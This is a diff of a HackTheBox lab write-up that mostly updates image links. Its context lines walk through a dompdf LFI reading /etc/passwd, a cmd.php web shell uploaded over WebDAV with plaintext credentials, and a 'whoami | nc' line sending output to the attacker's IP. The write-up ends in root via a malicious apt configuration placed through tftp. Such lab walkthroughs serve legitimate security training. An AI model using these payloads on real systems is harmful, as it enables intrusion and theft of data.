@@ -1,9 +1,10 @@
 HackTheBox
 # Scan
-![[Pasted image 20240331151311.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331151311.png)
 
 Web enumeration
-![[Pasted image 20240331152859.png]]
+
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331152859.png)
 Inspecting the end of source code:
 <!-- Todo: test dompdf on php 7.x -->
 
@@ -11,8 +12,9 @@ It mentions a dompdf technologie
 Looking for vulnerabities with **searchsploit** we found a potential LFI vulnerability
 
 Looking for a directory and it exists
-![[Pasted image 20240331200225.png]]
-![[Pasted image 20240331200336.png]]
+
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331200225.png)
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331200336.png)
 Command line interface:
 `php dompdf.php`
 `php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>`
@@ -33,7 +35,7 @@ Other option is to use the filter changing *-* by *_*
 
 `http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64_encode/resource=/etc/passwd`
 
-![[Pasted image 20240331200827.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240331200827.png)
 ### Creating a script to automatize
 `#!/bin/bash`
 
@@ -66,7 +68,7 @@ Other option is to use the filter changing *-* by *_*
 /home/user/.ssh/id_rsa.pub *checking for keys*
 /proc/net/tcp *see internal ports not open to us, it brings a hexadecimal code*
 
-![[Pasted image 20240401051048.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401051048.png)
 ## Enumerating using Squid Proxy
 ![[SquidProxy Internal Enumeration]]
 ## Ennumerating Apache
@@ -83,14 +85,15 @@ this credentials were stored in a file *hash*
 
 We can use this credentials on *webdav* path we found: /webdav_test_inception
 However we don't have access
-![[Pasted image 20240401062832.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401062832.png)
 ## WebDav Exploitation
 
 Webdav is a share file application to use by web.
 `davtest -url http://10.10.10.67/webdav_test_inception/ -auth webdav_tester:babygurl69`*it tests which files are accepted to be loaded by webdev*
 
 In this case php files are accepted by using a PUT request
-![[Pasted image 20240401092323.png]]
+
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401092323.png)
 
 Loading a *cmd.php* file to inject commands:
 <?php
@@ -102,12 +105,12 @@ We can authenticate directly in the url to upload the file:
 curl -s -X PUT http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/cmd.php -d @cmd.php
 ````
 
-![[Pasted image 20240401093215.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401093215.png)
 This upload the file as cmd.php and then we can execute the command:
 
 http://10.10.10.67/webdav_test_inception/cmd.php?cmd=whoami
 
-![[Pasted image 20240401093341.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401093341.png)
 
 As it's possible to inject, we try to set a reverse shell:
 
@@ -124,7 +127,7 @@ Creating a nc listening we don't get any shell so we can infer there are a firew
 If there is a firewall blocking ports, we can take advantage as we can inject code in the web site to create.
 ### Testing connection ports
 Verifying that the web server has netcat:
-![[Pasted image 20240401104444.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401104444.png)
 Trying to get a message from port 4443 
 whoami | nc 10.10.14.70 4443 *but there is not response*
 by udp:
@@ -139,13 +142,13 @@ In the pseudo-terminal we can use a tty:
 Browsing path */var/www* we found a *html* folder containing wolrdpress files
 
 In *wp-config.php* we found Database credentials:
-![[Pasted image 20240401154657.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401154657.png)
 >root:VwPddNh7xMZyDQoByQL4
 
 Even there is a mysql credential, there is not *mysql* installed in this machine.
 
 By testing this credentials for user cobb found as a user before.
-![[Pasted image 20240401154945.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401154945.png)
 
 # Privilege Escalation
 
@@ -153,10 +156,10 @@ We can connect to cobb user by ssh with proxychains:
 
 `proxychains ssh cobb@localhost`
 
-![[Pasted image 20240401160842.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401160842.png)
 As we are in sodo group, we can perform *sudo su* to be root in the container:
 
-![[Pasted image 20240401161002.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401161002.png)
 We can infer that machine IP is `192.168.0.1`, if this is not working, we can perform a hostDiscovy script.
 
 ## Port enumeration
@@ -178,13 +181,13 @@ for port in $(seq 1 65565); do
 done; wait
 tput cnorm
 ````
-![[Pasted image 20240401162650.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401162650.png)
 
 We found 3 open ports.
 ## Exploiting FTP
 
 As port 21 is open, we try to access as *anonymous* and we found some files
-![[Pasted image 20240401162858.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401162858.png)
 ### Getting crontab file
 ![[Crontab file]]
 
@@ -203,9 +206,9 @@ In **forwardshell.sh**
 `tftp>` 
  `>put malicious /etc/apt/apt.conf.d/malicious`
 
-![[Pasted image 20240401174832.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401174832.png)
 Now we can wait for the the apt update cron to be executed.
 Finnaly we've got root access
 
-![[Pasted image 20240401175635.png]]
+![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401175635.png)
 
